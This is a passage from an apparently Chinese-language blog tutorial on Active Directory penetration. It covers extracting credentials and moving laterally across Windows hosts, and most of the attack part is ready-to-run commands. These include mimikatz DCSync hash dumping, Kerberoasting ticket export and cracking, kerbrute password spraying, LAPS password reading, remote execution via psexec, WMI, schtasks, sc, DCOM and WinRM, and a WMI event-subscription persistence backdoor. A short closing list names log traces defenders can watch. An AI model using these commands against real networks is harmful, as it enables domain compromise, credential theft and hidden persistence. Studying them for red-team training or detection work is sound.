+<p>而为什么有的抓不到明文密码，主要还是kb2871997的问题。kb2871997补丁会删除除了wdigest ssp以外其他ssp的明文凭据，但对于wdigest ssp只能选择禁用。用户可以选择将<code>·</code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential`更改为0来禁用。</p>
+<p>它在winserver 2012 R2及以上版本已默认集成。在winserver 2012R2上面测试，手动添加上述注册表的值为1，然后抓密码，发现只有wdigest能抓到明文密码了：</p>
+<p>再提一下kb2871997补丁问题，除了“解决”上述明文密码问题，还“解决”了pth问题，但是kb2871997对于本地Administrator(rid为500，操作系统只认rid不认用户名)和本地管理员组的域用户是没有影响的,此外，kb287199除了“解决”上述明文密码问题，还“解决”了pth问题，但是kb2871997对于本地Administrator(rid为500，操作系统只认rid不认用户名)和本地管理员组的域用户是没有影响的。</p>
+<h2>4.3、域hash</h2>
+<p>当拿到域控权限时，可以从域控中的C:\Windows\NTDS\NTDS.dit导出所有用户hash。因为ntds.dit被占用，因此需要利用如卷影备份等手段copy出ntds.dit，然后利用如NTDSDumpEx.exe解析hash</p>
+<p>当拷贝ntds.dit时，由于网络、文件大小等问题，可以使用DRS协议获取hash凭据：</p>
+<pre><code>mimikatz.exe  privilege::debug &quot;lsadump::dcsync /domain:jumbolab.com /all /csv&quot;  exit
+</code></pre>
+<h2>4.4、token窃取</h2>
+<p>token是一个描述进程或线程安全上下文的对象。token即令牌包括了与进程或线程关联的用户账号的标识和特权，当用户登录时，系统通过将用户密码与安全数据库进行比对来验证用户密码正确性，如果密码正确，系统将生成访问token。该用户的进程都携带该token，可以利用DuplicateTokenEx api对现有token的复制，然后使用CreateProcessWithToken api对复制的token创建一个新的进程。</p>
+<blockquote>
+<p>它们的攻击路径：Token Stealing (令牌窃取)</p>
+</blockquote>
+<blockquote>
+<p>在典型的攻击场景中，这两个 API 通常按以下序列被调用，以伪装成管理员或 SYSTEM 用户：</p>
+</blockquote>
+<blockquote>
+<p>获取目标令牌：使用 OpenProcess 打开目标高权限进程（如 lsass.exe）。</p>
+</blockquote>
+<blockquote>
+<p>提取句柄：使用 OpenProcessToken 获取该进程的访问令牌句柄。</p>
+</blockquote>
+<blockquote>
+<p>复制令牌：调用 DuplicateTokenEx 并指定 TokenPrimary 类型，将提取到的“模拟令牌”复制成可执行的“主令牌”。</p>
+</blockquote>
+<blockquote>
+<p>启动进程：调用 CreateProcessWithTokenW 将复制的令牌附着到新的 cmd.exe 或其他恶意进程上，从而实现权限提升。</p>
+</blockquote>
+<blockquote>
+<p>简而言之，这就是一个完整的“身份盗用”流程：先取来身份凭证（Token），再伪造一个合法证件（复制令牌），最后利用它骗过系统监控（启动新进程）。</p>
+</blockquote>
+<h2>4.5、Kerberoasting</h2>
+<p>在KRB_TGS_REP中，TGS会返回给Client一张票据ST，而ST是由Client请求的Server端密码进行加密的。当Kerberos协议设置票据为RC4方式加密时，我们就可以通过爆破在Client端获取的票据ST，从而获得Server端的密码。</p>
+<p>在上述SPN信息收集中得到一个域用户test注册了一个SPN，我们请求TGS：</p>
+<pre><code>$SPNName  = &#39;test/test&#39;
+Add-Type  -AssemblyNAme System.IdentityModel
+New-Object  System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList  $SPNName
+</code></pre>
+<p>再利用mimikatz导出：</p>
+<pre><code>kerberos::list  /export
+</code></pre>
+<p>然后利用tgsrepcrack暴力破解：</p>
+<pre><code>python  tgsrepcrack.py wordlist.txt 2-40a10000-win7user@test\~test-JUMBOLAB.COM.kirbi
+</code></pre>
+<p>就可以成功获取该域用户密码</p>
+<p><a href="https://xz.aliyun.com/news/13137">深入理解 Kerberoasting 攻击</a></p>
+<h2>4.6、密码喷射</h2>
+<p>内网中的爆破</p>
+<pre><code class="language-爆破账户">kerbrute  userenum -d jumbolab.com usernames.txt
+</code></pre>
+<pre><code class="language-密码喷射">kerbrute  passwordspray -d jumbolab.com username.txt  aA1234567
+</code></pre>
+<h2>4.7、LAPS</h2>
+<p>LocalAdministrator Password Solution是密码解决方案，为了防止一台机器被抓到密码后，然后网内都是同密码机器导致被横向渗透。但是也存在相应的安全隐患，当我们拿下域控时，可以查看计算机本地密码;当权限配置不当时，也会导致其他用户有权限查看他人计算机本地密码：</p>
+<pre><code>Get-ADComputer  computername -Properties ms-Mcs-AdmPwd | select name, ms-Mcs-AdmPwd
+</code></pre>
+<h1>05 横向移动</h1>
+<p>前提是获取到某个机器的账号密码或者hash</p>
+<h2>5.1、账号密码链接</h2>
+<h3>a.IPC</h3>
+<pre><code>net use \\目标ip\ipc$  “password” /user:username
+</code></pre>
+<p>作用：建立到目标主机的 SMB 认证会话。它本身不执行命令，但后续很多远程命令如 at、schtasks、sc、reg 等可以依赖这个已建立的认证通道。</p>
+<h3>b.Psexec</h3>
+<pre><code># 用服务启动的方式：
+psexec  \\target -accepteula  -u username -p  password cmd.exe
+psexec.py  jumbolab.com/administrator@目标ip
+</code></pre>
+<p>原理：通过 SMB 访问目标的 ADMIN$ 共享，上传服务程序，然后远程创建并启动一个服务，通过服务执行命令。执行完成后通常会删除服务。</p>
+<p>上下两个是一样的，不过下面的是python版本就是</p>
+<h3>c、WMI</h3>
+<p>WMI 是 Windows Management Instrumentation，Windows 管理规范。可以通过它远程调用方法，例如创建进程。</p>
+<pre><code># 方法一
+
+wmic  /user:&quot;jumbolab.com\win7user&quot;  /password:&quot;password&quot;  /node:172.16.127.184 process call create &quot;notepad&quot;
+
+
+
+#  方法二
+
+Invoke-WmiMethod  -class win32_process -name create -argumentlist &#39;notepad&#39; -ComputerName  172.16.127.184 -Credential &#39;jumbolab.com\win7user&#39;
+
+
+
+#  方法三
+
+$filterName  = &#39;BotFilter82&#39;
+
+$consumerName  = &#39;BotConsumer23&#39;
+
+$exePath  = &#39;C:\Windows\System32\notepad.exe&#39;
+
+$Query  = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE  TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;
+
+$WMIEventFilter  = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot;  -Arguments @{Name=$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query}  -ErrorAction Stop -ComputerName 172.16.127.184 -Credential  ‘jumbolab.com\win7user’
+
+$WMIEventConsumer  = Set-WmiInstance -Class CommandLineEventConsumer -Namespace  &quot;root\subscription&quot; -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}  -ComputerName 172.16.127.184 -Credential  ‘jumbolab.com\win7user’
+
+Set-WmiInstance  -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot;  -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
+</code></pre>
+<p>方法1中</p>
+<ul>
+<li>wmic：WMI 命令行工具。</li>
+<li>/user、/password：远程凭据。</li>
+<li>/node：目标主机。</li>
+<li>process call create &quot;notepad&quot;：调用 Win32_Process 类的 Create 方法，在目标主机上启动 notepad。</li>
+</ul>
+<p> 方法2和1作用一样，不过3是创建 WMI 事件订阅，形成持久化后门</p>
+<ul>
+<li>__EventFilter：事件过滤器，定义触发条件。这里使用 WQL 查询，监测 Win32_PerfFormattedData_PerfOS_System 的实例修改事件。</li>
+<li>CommandLineEventConsumer：事件消费者，当事件触发时执行指定的可执行文件，这里是 notepad.exe。</li>
+<li>__FilterToConsumerBinding：把过滤器和消费者绑定起来。</li>
+<li>当满足 WQL 查询条件时，目标主机就会自动执行 notepad.exe。这种方式隐蔽性较强，常用于持久化。</li>
+</ul>
+<h3>d、Schtasks</h3>
+<pre><code>schtasks  /create /s 1.1.1.1 /u domain\Administrator /p password /ru &quot;SYSTEM&quot;  /tn &quot;windowsupdate&quot;  /sc DAILY  /tr &quot;calc&quot; /F
+
+schtasks  /run /s 1.1.1.1 /u domain\Administrator /p password /tn windowsupdate
+</code></pre>
+<ul>
+<li><p>schtasks：Windows 计划任务命令。</p>
+</li>
+<li><p>/create：创建任务。</p>
+</li>
+<li><p>/s 1.1.1.1：目标主机。</p>
+</li>
+<li><p>/u domain\Administrator /p password：远程凭据。</p>
+</li>
+<li><p>/ru &quot;SYSTEM&quot;：任务以 SYSTEM 账户身份运行。</p>
+</li>
+<li><p>/tn &quot;windowsupdate&quot;：任务名称。</p>
+</li>
+<li><p>/sc DAILY：触发器为每天运行。</p>
+</li>
+<li><p>/tr &quot;calc&quot;：要运行的程序。</p>
+</li>
+<li><p>/F：强制覆盖同名任务。</p>
+</li>
+</ul>
+<h3>e、AT</h3>
+<pre><code>at \\1.1.1.1 15:15 calc
+</code></pre>
+<p>作用：在远程主机的指定时间运行程序。该命令依赖已建立的 IPC 认证会话和远程 Task Scheduler 服务，较老的系统中常见，现在基本被 schtasks 取代。</p>
+<h3>f、SC</h3>
+<pre><code>sc  \\1.1.1.1 create windowsupdate binpath= &quot;calc&quot;
+sc  \\1.1.1.1 start windowsupdate
+</code></pre>
+<ul>
+<li><p>sc：Windows 服务控制管理器命令。</p>
+</li>
+<li><p>\1.1.1.1：目标主机。</p>
+</li>
+<li><p>create windowsupdate：创建名为 windowsupdate 的服务。</p>
+</li>
+<li><p>binpath= &quot;calc&quot;：指定服务二进制文件路径为 calc。</p>
+</li>
+<li><p>start windowsupdate：启动该服务。</p>
+</li>
+</ul>
+<p>作用：通过远程创建并启动服务来执行命令/程序。需要目标主机管理员权限。实际利用中 binpath 常指向恶意可执行文件或类似 cmd.exe /c ... 的命令。</p>
+<h3>g、REG</h3>
+<pre><code>reg add \\1.1.1.1\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry /t REG_SZ /d &quot;calc&quot;
+</code></pre>
+<ul>
+<li><p>reg add：注册表添加命令。</p>
+</li>
+<li><p>\1.1.1.1\HKLM...\Run：远程主机的 HKLM\Software\Microsoft\Windows\CurrentVersion\Run 键。</p>
+</li>
+<li><p>/v myentry：值名称。</p>
+</li>
+<li><p>/t REG_SZ：值类型为字符串。</p>
+</li>
+<li><p>/d &quot;calc&quot;：值数据为 calc。</p>
+</li>
+</ul>
+<p>作用：在远程主机的自启动注册表项 Run 中添加一个值。当用户登录时，系统会自动运行该值指向的程序。这通常用于持久化。</p>
+<h3>h、DCOM</h3>
+<pre><code># 方法一
+
+$com  = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;1.1.1.1&quot;))
+
+$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;/c  calc.exe&quot;,&quot;Minimized&quot;)
+
+#  方法二
+
+$com  = [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;1.1.1.1&quot;)
+
+$obj  = [System.Activator]::CreateInstance($com)
+
+$item  = $obj.item()
+
+$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c  calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)
+
+#  方法三
+
+$com  = [Type]::GetTypeFromCLSID(&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;,&quot;1.1.1.1&quot;)
+
+$obj  = [System.Activator]::CreateInstance($com)
+
+$obj.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c  calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)
+</code></pre>
+<p>方法一</p>
+<p>通过 ProgID 为 MMC20.Application 的 DCOM 组件在远程主机 1.1.1.1 上创建对象。</p>
+<p>调用 ExecuteShellCommand 方法执行命令。</p>
+<p>参数含义：</p>
+<ul>
+<li><p>&#39;cmd.exe&#39;：要执行的程序。</p>
+</li>
+<li><p>$null：目录参数为空。</p>
+</li>
+<li><p>&quot;/c calc.exe&quot;：命令行参数。</p>
+</li>
+<li><p>&quot;Minimized&quot;：窗口最小化。</p>
+</li>
+</ul>
+<p>方法二</p>
+<ul>
+<li><p>CLSID 9BA05972-F6A8-11CF-A442-00A0C90A8F39 是 ShellWindows。</p>
+</li>
+<li><p>通过 DCOM 远程创建 ShellWindows 对象，获取 Shell.Application，然后调用 ShellExecute 执行命令。</p>
+</li>
+</ul>
+<p>方法三</p>
+<ul>
+<li><p>CLSID C08AFD90-F2A1-11D1-8455-00A0C91F3880 是 Shell.Application。</p>
+</li>
+<li><p>直接远程实例化 Shell.Application，调用 ShellExecute 执行命令。</p>
+</li>
+</ul>
+<p>DCOM 方式需要目标主机允许 DCOM 调用，并具备相应权限。</p>
+<h3>i、WINRM</h3>
+<pre><code>winrs -r:http://1.1.1.1:5985  -u:Administrator -p:password   &quot;whoami&quot;
+
+winrs  -r:http://dcserver.jumbolab.com:5985 -u:jumbolab\administrator -p:password  &quot;whoami &quot;
+</code></pre>
+<ul>
+<li><p>winrs：Windows Remote Shell 客户端，基于 WinRM 服务。</p>
+</li>
+<li><p>-r:<a href="http://1.1.1.1:5985%EF%BC%9A%E6%8C%87%E5%AE%9A%E8%BF%9C%E7%A8%8B">http://1.1.1.1:5985：指定远程</a> WinRM 服务地址，默认 HTTP 端口为 5985。</p>
+</li>
+<li><p>-u:Administrator -p:password：远程凭据。</p>
+</li>
+<li><p>&quot;whoami&quot;：在远程主机上执行的命令。</p>
+</li>
+</ul>
+<p>作用：通过 WinRM/WS-Management 协议在远程主机上执行命令。目标主机需要启用 WinRM 服务，并监听 5985（HTTP）或 5986（HTTPS）端口。</p>
+<h3>总结</h3>
+<p>总结下来就是利用</p>
+<ul>
+<li><p>SMB/ADMIN$ 访问日志</p>
+</li>
+<li><p>服务创建/启动事件</p>
+</li>
+<li><p>计划任务创建/运行事件</p>
+</li>
+<li><p>WMI 事件订阅</p>
+</li>
+<li><p>注册表 Run 键修改</p>
+</li>
+<li><p>DCOM 远程调用日志</p>
+</li>
+<li><p>WinRM 连接日志
+这些协议、服务、端口和留下的日志痕迹，在防御中可以重点关注。</p>
+</li>
+</ul>
+<h2>5.2、PTH</h2>
+<p>当我们没有明文账号密码，只有hash时，可以尝试hash传递。</p>
+</article>
+  </div>
+</div><script>
+  // 正文插图兜底：失效图片替换为占位块，避免出现破图
+  document.querySelectorAll('article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+</script></body>
+</html>
